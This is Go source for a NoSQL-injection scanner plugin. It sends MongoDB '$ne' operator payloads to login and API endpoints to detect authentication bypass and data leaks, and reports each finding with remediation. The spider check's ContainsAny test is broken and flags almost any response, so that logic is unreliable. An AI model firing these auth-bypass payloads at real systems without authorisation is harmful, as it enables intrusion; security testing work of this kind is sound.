package nosqliengine

import (
	"DORM/models"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

// ============================================================
//  NoSQL INJECTION ENGINE — v3.0 "Mongo Mayhem"
//  $ne · JSON Body · $where RCE · $regex · CouchDB · SSJS
// ============================================================

type NoSQLPlugin struct{}

func (p *NoSQLPlugin) Name() string { return "NoSQL Injection (Mongo Mayhem v2)" }

func (p *NoSQLPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !models.IsWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := models.GetURL(target, "")

	endpoints := []string{"/login", "/api/users", "/search", "/products", "/api/find", "/", "/api/login", "/auth"}
	params := []string{"user", "username", "u", "search", "q", "id", "token", "code", "password", "email"}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 1 — GET $ne Operator Injection
	// ══════════════════════════════════════════════════════════════════════
	for _, ep := range endpoints {
		for _, param := range params {
			targetURL := baseURL + ep

			// Baseline
			reqBase, _ := http.NewRequest("GET", targetURL, nil)
			qBase := reqBase.URL.Query()
			qBase.Add(param, "dorm_random_value_9999")
			reqBase.URL.RawQuery = qBase.Encode()
			respBase, err := client.Do(reqBase)
			if err != nil {
				continue
			}
			bodyBase, _ := io.ReadAll(io.LimitReader(respBase.Body, 65536))
			_ = respBase.Body.Close()
			lenBase := len(bodyBase)
			codeBase := respBase.StatusCode

			// $ne attack
			attackQuery := fmt.Sprintf("%s[$ne]=dorm_random_value_9999", param)
			fullAttackURL := fmt.Sprintf("%s?%s", targetURL, attackQuery)
			reqAttack, _ := http.NewRequest("GET", fullAttackURL, nil)
			respAttack, err := client.Do(reqAttack)
			if err != nil {
				continue
			}
			bodyAttack, _ := io.ReadAll(io.LimitReader(respAttack.Body, 65536))
			_ = respAttack.Body.Close()
			lenAttack := len(bodyAttack)
			codeAttack := respAttack.StatusCode

			// Require an explicit auth-failure code (401/403), not just
			// "anything other than 200" — a baseline 404/301/500 flipping to
			// 200 on the attack request is extremely common for reasons
			// that have nothing to do with auth (routing quirks, redirects,
			// an endpoint that doesn't even exist), and across 8 endpoints
			// x 10 params that combination is close to guaranteed on any
			// real site, which is why this used to fire constantly.
			if (codeBase == 401 || codeBase == 403) && codeAttack == 200 {
				return &models.Vulnerability{
					Target:   target,
					Name:     "NoSQL Injection (Operator: $ne — Auth Bypass)",
					Severity: "HIGH",
					CVSS:     8.2,
					Description: fmt.Sprintf(
						"Authentication bypassed with MongoDB '$ne' operator.\nParam: %s\nBaseline: HTTP %d → Attack: HTTP %d",
						param, codeBase, codeAttack,
					),
					Solution:  "Enforce user inputs as string instead of object. Implement input type validation.",
					Reference: "OWASP NoSQL Injection / CWE-943",
				}
			}

			// A bare byte-count increase is not evidence of a data leak on
			// its own — dynamic pages vary in size constantly for unrelated
			// reasons (ads, CSRF tokens, timestamps...). Only flag this when
			// the baseline looked like an empty/no-results response AND the
			// attack response is substantially larger AND actually looks
			// like it contains multiple returned JSON records.
			if lenBase < 50 && lenAttack > lenBase+500 && strings.Count(string(bodyAttack), "{") >= 3 {
				return &models.Vulnerability{
					Target:   target,
					Name:     "NoSQL Injection ($ne Data Leak)",
					Severity: "HIGH",
					CVSS:     7.5,
					Description: fmt.Sprintf(
						"An empty/no-results baseline turned into a much larger, multi-record-shaped response with the '$ne' operator — likely a data dump.\nParam: %s\nBaseline: %d bytes → Attack: %d bytes",
						param, lenBase, lenAttack,
					),
					Solution:  "Implement input type validation. Filter operator injections.",
					Reference: "CWE-943: Improper Neutralization in Data Query Logic",
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 2 — JSON Body Injection (POST application/json)
	// ══════════════════════════════════════════════════════════════════════
	jsonResult := RunMongoJSONInjection(client, baseURL, target)
	if jsonResult != nil {
		return jsonResult
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 3 — POST Form Injection (user[$ne]=x)
	// ══════════════════════════════════════════════════════════════════════
	formResult := runFormInjection(client, baseURL, target)
	if formResult != nil {
		return formResult
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 4 — $where JavaScript Time-Based
	// ══════════════════════════════════════════════════════════════════════
	timeResult := RunTimeBased(client, baseURL, target)
	if timeResult != nil {
		return timeResult
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 5 — $regex Data Leak Detection
	// ══════════════════════════════════════════════════════════════════════
	regexResult := RunRegexLeak(client, baseURL, target)
	if regexResult != nil {
		return regexResult
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 6 — Time-Based Boolean (GET)
	// ══════════════════════════════════════════════════════════════════════
	boolResult := runTimeBasedBoolean(client, baseURL, target, endpoints, params)
	if boolResult != nil {
		return boolResult
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 7 — CouchDB Unauthorized Access
	// ══════════════════════════════════════════════════════════════════════
	couchResult := RunCouchProbe(client, baseURL, target)
	if couchResult != nil {
		return couchResult
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 8 — Spider POST Integration
	// ══════════════════════════════════════════════════════════════════════
	spiderResult := runSpiderIntegration(client, target)
	if spiderResult != nil {
		return spiderResult
	}

	return nil
}

// runFormInjection tests POST form-encoded NoSQL injection.
func runFormInjection(client *http.Client, baseURL string, target models.ScanTarget) *models.Vulnerability {
	formEndpoints := []string{"/login", "/api/login", "/auth", "/signin"}
	formParams := []string{"username", "user", "email", "password", "pass"}

	for _, ep := range formEndpoints {
		targetURL := baseURL + ep
		for _, param := range formParams {
			// Baseline
			baseData := url.Values{}
			baseData.Set("username", "invalid_user_x9")
			baseData.Set("password", "invalid_pass_x9")
			baseReq, _ := http.NewRequest("POST", targetURL, strings.NewReader(baseData.Encode()))
			baseReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			baseResp, err := client.Do(baseReq)
			if err != nil {
				continue
			}
			_ = baseResp.Body.Close()
			baseCode := baseResp.StatusCode

			// Attack: user[$ne]=invalid_dorm
			attackData := url.Values{}
			attackData.Set(param+"[$ne]", "invalid_dorm_x9")
			attackData.Set("password[$ne]", "invalid_dorm_x9")
			attackReq, _ := http.NewRequest("POST", targetURL, strings.NewReader(attackData.Encode()))
			attackReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			attackResp, err := client.Do(attackReq)
			if err != nil {
				continue
			}
			_ = attackResp.Body.Close()
			attackCode := attackResp.StatusCode

			if baseCode != 200 && attackCode == 200 {
				return &models.Vulnerability{
					Target:   target,
					Name:     "NoSQL Injection (POST Form — $ne Operator)",
					Severity: "CRITICAL",
					CVSS:     9.1,
					Description: fmt.Sprintf(
						"Auth bypass via '$ne' operator in form-encoded POST body.\nEndpoint: %s\nPayload: %s[$ne]=invalid_dorm_x9",
						targetURL, param,
					),
					Solution:  "Validate input types server-side; use `is_string()` in PHP, `typeof` in Node.js.",
					Reference: "OWASP NoSQL Injection",
				}
			}
		}
	}
	return nil
}

// runTimeBasedBoolean tests time-based boolean NoSQL injection via GET.
func runTimeBasedBoolean(client *http.Client, baseURL string, target models.ScanTarget, endpoints, params []string) *models.Vulnerability {
	return RunTimeBasedBoolean(client, baseURL, target, endpoints, params)
}

// runSpiderIntegration tests spider-discovered POST endpoints for NoSQL injection.
func runSpiderIntegration(client *http.Client, target models.ScanTarget) *models.Vulnerability {
	key := "endpoints_" + target.IP
	existing, ok := models.SharedData.Load(key)
	if !ok {
		return nil
	}

	jsonPayloads := GetJSONPayloads()
	spiderEndpoints := existing.([]models.Endpoint)

	for _, ep := range spiderEndpoints {
		if ep.Method == "POST" {
			for _, pl := range jsonPayloads[:min(len(jsonPayloads), 2)] {
				resp, err := client.Post(ep.URL, "application/json", strings.NewReader(pl.Body))
				if err != nil {
					continue
				}
				body := models.ReadBody(resp, 65536)

				if resp.StatusCode == 200 && strings.ContainsAny(body, "token session user admin") {
					return &models.Vulnerability{
						Target:   target,
						Name:     "NoSQL Injection (Spider-Discovered POST Endpoint)",
						Severity: "CRITICAL",
						CVSS:     9.1,
						Description: fmt.Sprintf(
							"JSON NoSQL injection succeeded on spider-discovered POST endpoint.\nURL: %s\nPayload: %s",
							ep.URL, pl.Body,
						),
						Solution:  "Filter MongoDB operators in all JSON inputs.",
						Reference: "OWASP NoSQL Injection",
					}
				}
			}
		}
	}
	return nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
